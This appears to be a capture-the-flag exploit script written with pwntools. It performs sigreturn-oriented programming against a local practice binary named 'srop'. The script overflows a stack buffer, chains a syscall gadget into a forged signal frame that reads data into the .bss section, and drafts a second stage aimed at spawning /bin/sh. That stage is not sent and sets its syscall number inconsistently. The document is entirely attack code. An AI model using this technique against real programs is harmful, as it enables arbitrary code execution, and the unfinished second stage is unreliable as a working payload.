from pwn import *

p = process('./srop')
e = ELF('./srop')

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

# if you don't write this.. error...
context.arch = "x86_64"
context.log_level = 'debug'

gdb.attach(p)

gadget = next(e.search(asm("pop rax; syscall")))
syscall = next(e.search(asm("syscall")))

bss = e.bss()

# print(gadget)
slog("gadget", gadget)
slog("bss", bss)

buf2ret = 0x18
binsh = b"/bin/sh\x00"

#exploit[1] - read "/bin/sh"
# read(0, bss, 0x1000)
exploit = b"A"*buf2ret
exploit += p64(gadget)
exploit += p64(0xf)
 
#ucontext
frame = SigreturnFrame()
# read(0, bss, 0x1000)
frame.rax = 0        # SYS_read
frame.rsi = bss
frame.rdx = 0x1000
frame.rdi = 0
frame.rip = syscall
frame.rsp = bss

exploit += bytes(frame)

# exploit += p64(0x0) * 5
 
# #sigcontext
# exploit += p64(0x0)     #R8
# exploit += p64(0x0)     #R9
# exploit += p64(0x0)     #R10
# exploit += p64(0x0)     #R11
# exploit += p64(0x0)     #R12
# exploit += p64(0x0)     #R13
# exploit += p64(0x0)     #R14
# exploit += p64(0x0)     #R15
 
# exploit += p64(0x0)   #RDI
# exploit += p64(bss)     #RSI
# exploit += p64(0x0)     #RBP
# exploit += p64(0x0)     #RBX
# exploit += p64(0x500)     #RDX
# exploit += p64(0x0)    #RAX SYS_read
# exploit += p64(0x0)     #RCX
# exploit += p64(bss) #RSP
# #exploit += p64(bss) #RIP
# exploit += p64(syscall) #RIP
# exploit += p64(0x0)     #eflags
# exploit += p64(0x0)    #cs
# exploit += p64(0x0)     #gs
# exploit += p64(0x0)     #fs
# exploit += p64(0x0)    #ss

exploit2 = p64(gadget)
exploit2 += p64(15)

#ucontext
exploit2 += p64(0x0) * 5
 
#sigcontext
exploit2 += p64(0x0)     #R8
exploit2 += p64(0x0)     #R9
exploit2 += p64(0x0)     #R10
exploit2 += p64(0x0)     #R11
exploit2 += p64(0x0)     #R12
exploit2 += p64(0x0)     #R13
exploit2 += p64(0x0)     #R14
exploit2 += p64(0x0)     #R15
 
exploit2 += p64(bss+0xc8)   #RDI
exploit2 += p64(0x0)     #RSI
exploit2 += p64(0x0)     #RBP
exploit2 += p64(0x0)     #RBX
exploit2 += p64(0x0)     #RDX
exploit2 += p64(0x0)    #RAX SYS_read
exploit2 += p64(0x0)     #RCX
exploit2 += p64(bss) #RSP
#exploit += p64(bss) #RIP
exploit2 += p64(syscall) #RIP
exploit2 += p64(0x0)     #eflags
exploit2 += p64(0x0)    #cs
exploit2 += p64(0x0)     #gs
exploit2 += p64(0x0)     #fs
exploit2 += p64(0x0)    #ss
exploit2 += binsh

p.send(exploit)
# p.send(exploit2)

p.interactive()